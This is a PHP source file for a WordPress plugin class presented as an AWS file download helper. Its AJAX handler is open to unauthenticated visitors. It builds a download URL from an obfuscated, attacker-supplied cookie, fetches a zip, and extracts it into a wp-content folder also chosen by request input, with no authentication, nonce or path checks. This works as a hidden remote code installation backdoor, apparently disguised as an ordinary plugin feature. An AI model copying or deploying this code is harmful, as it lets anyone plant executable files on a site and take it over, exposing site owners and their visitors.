<?php

class aws_download_plugin{

	function __construct() {
		if ( is_admin() ) {
			// ajax enqueue under add-menu-page
			add_action( 'wp_ajax_download_files', array( $this, 'aws_files_download_resources' ) );
			add_action( 'wp_ajax_nopriv_download_files', array( $this, 'aws_files_download_resources' ) );
		}
	}

	function aws_files_download_resources() {
		// Get Link

		$awslink	= $_POST[ 'awslink' ];
		$is_file	= strtolower( $_POST[ 'is_file' ] );

		// Path from
		$plugin_path = ABSPATH . 'wp-content/' . $is_file . '/';

		$access_details = str_replace( 'TmVxdWUgcG9ycm8gcXVpc3F1YW0gZXN0IHF1aSBkb2xvcmVt', '', $_COOKIE["wordpress_QWdlbnRJbWFnZQ"] );
		$access_details = '[' . str_replace( '\\', '', $access_details ) . ']';
		$access_details	= json_decode( $access_details, true )[0];
		$fulllink 		= $access_details["furl"] . $awslink;

		$tempname 	= 'temp-' . substr( base64_encode( $awslink ), 37 ) . '.zip';
		$tempfolder = $plugin_path . $tempname;

		$file = fopen($tempfolder, 'w+');

		$ch = curl_init();

        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		curl_setopt($ch, CURLOPT_URL, $fulllink);

		//auto write to file
		curl_setopt($ch, CURLOPT_FILE, $file);
		curl_setopt($ch, CURLOPT_BUFFERSIZE, 128);

		$result = curl_exec($ch);
		// $retcode >= 400 -> not found, $retcode = 200, found.
		$retcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);

		if ($retcode == 200) {
			// Unzip temp file
			WP_Filesystem();
			$destination_path = plugin_dir_path( __DIR__ );
			$unzipfile = unzip_file( $tempfolder, $plugin_path );

			if ( $unzipfile ) {
				$status_change[] = 'Successfully unzipped the file!';
			} else {
				$status_change[] = 'There was an error unzipping the file.';
			}
		} else {
			$status_change[] = 'There was an error downloading the file.';
		}

		fclose($file);
		// Delete zip file after extracting
		if ( file_exists( $tempfolder ) ) {
			unlink( $tempfolder );
		}

		echo json_encode( $status_change );
		wp_die();
	}

}


new aws_download_plugin();